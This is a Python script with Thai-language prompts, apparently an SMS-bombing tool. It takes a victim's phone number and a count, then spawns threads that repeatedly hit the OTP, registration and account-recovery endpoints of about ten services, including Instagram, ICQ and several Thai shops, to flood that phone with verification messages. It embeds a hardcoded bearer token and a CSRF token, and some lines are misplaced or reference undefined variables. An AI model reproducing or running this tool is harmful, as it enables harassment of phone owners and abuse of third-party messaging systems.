import requests,time,threading,random,json,os
from threading import Thread
os.system("clear")
print("""

┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│                         ███████╗ ██████╗ ███╗   ██╗███████╗                         │
│                         ██╔════╝██╔═══██╗████╗  ██║██╔════╝                         │
│                         █████╗  ██║   ██║██╔██╗ ██║█████╗                           │
│                         ██╔══╝  ██║   ██║██║╚██╗██║██╔══╝                           │
│                         ██║     ╚██████╔╝██║ ╚████║███████╗                         │
│                         ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚══════╝                         │
│                                                                  FONE Script 1.0    │
└─────────────────────────────────────────────────────────────────────────────────────┘ 
         
""")
print ("CREDIT : เอฟวันก๊อต")
print ("ทำโดย : เอฟวันก๊อต")
print ("")
phone = input("› หมายเลขโทรศัพท์ : ")
print('')
NUM = int(input("› จำนวน ข้อความการยิง  : "))
print("")
print("start") 
print("")

def SCX2OTP1():

    head={
        "content-type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "Referer": "https://www.infinitygamebox.com/"
        }
    url="https://api.infinitygamebox.com/api/RegisterService/RequestOTP"
    data={"Phone":phone}
    requests.post(url,headers=head,json=data)
    print(f"› OTP {phone} แล้ว")
 
def TrueShop1():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username":phone})
	print(f"› OTP {phone} แล้ว")
	
def MOVIDER1():
	requests.post("https://samartbet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})
	print(f"› OTP {phone} แล้ว")
	
def UNACADE1():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print(f"› OTP {phone} แล้ว")
	
def RSMALL12():

    head={
        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2Mzc3NjI2NjMsImV4cCI6MTY0MDM1NDY2MywianRpIjoiMVZBNld1VjlDb1d3R3ZUeUdqOWN5diIsInN1YiI6InNob3AxNzgxQVBJIiwic2NvcGUiOlsicHJvZHVjdHMuYWxsIiwib3JkZXIuYWxsIiwicGF5bWVudC5hbGwiLCJwcm9tb3Rpb24uYWxsIiwibWVtYmVycy5hbGwiLCJtZW1iZXJzLmxpc3QiLCJ1dGlsaXR5LmFsbCIsInV0aWxpdHkubGlzdCIsIm1lbnUuYWxsIiwibWVudS5saXN0IiwiYnV5bm93Y2FtcGFpZ24uZGV0YWlsIiwicmV3YXJkLmFsbCJdLCJ1c2VyX2tleSI6ImJkNmYwZWQ5YmZiYzNhMWIzNmJlOGIzMWQ3MmM0MDU1N2UwMzE2OWQ3M2ZjNGY3YjZkNThkZDY3ZTk2ZjUyOTAiLCJ1c2VyX21vZGVsIjoiIiwidXNlcl9hZ2VudCI6Ik1vemlsbGFcLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFJlZG1pIDhBKSBBcHBsZVdlYktpdFwvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lXC85NC4wLjQ2MDYuODUgTW9iaWxlIFNhZmFyaVwvNTM3LjM2IiwiR0RQUl9BQ0NFUFQiOiJOIn0.hgX9TeFiyErPWvqlFTkcxTcT0TtsoVVEh6gok2-RonM",
        "content-type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
        "Referer": "https://www.rsmall.com/"
        }
    url="https://api.starzth.com/homeshopping/v2/register/request"
    data={"username":phone,"name_th":"Hzhxz","lastname_th":"Ehegeg","password":"098098azZ","birthday":"1995-06-06","sex":"M","telephone":phone}
    requests.post(url,headers=head,json=data)
    print(f"› OTP {phone} แล้ว")
    
def DEEMO123():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone,"user_id":"EMP02","full_name":"Tried Threa"})
	print(f"› OTP {phone} แล้ว")
	
def MONOMAX():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=660{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
print(f"› OTP {phone} แล้ว")
    
def BOOTAPPS():
     requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": "+66"+phone})
print(f"› OTP {phone} แล้ว")
	
def ICQQCIFFS():
    requests.post("https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=headers)
print(f"› OTP {phone} EH4404 ")

def HUMDUM():
	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": "0"+phone})
	print(f"ส่งไปแล้วไอสัส")
    

for i in range(NUM):
    threading.Thread(target=SCX2OTP1).start()
    threading.Thread(target=TrueShop1).start()
    threading.Thread(target=MOVIDER1).start()
    threading.Thread(target=UNACADE1).start()
    threading.Thread(target=RSMALL12).start()
    threading.Thread(target=DEEMO123).start()
    threading.Thread(target=MONOMAX).start()
    threading.Thread(target=BOOTAPPS).start()
    threading.Thread(target=ICQQCIFFS).start()
    threading.Thread(target=HUMDUM).start()
    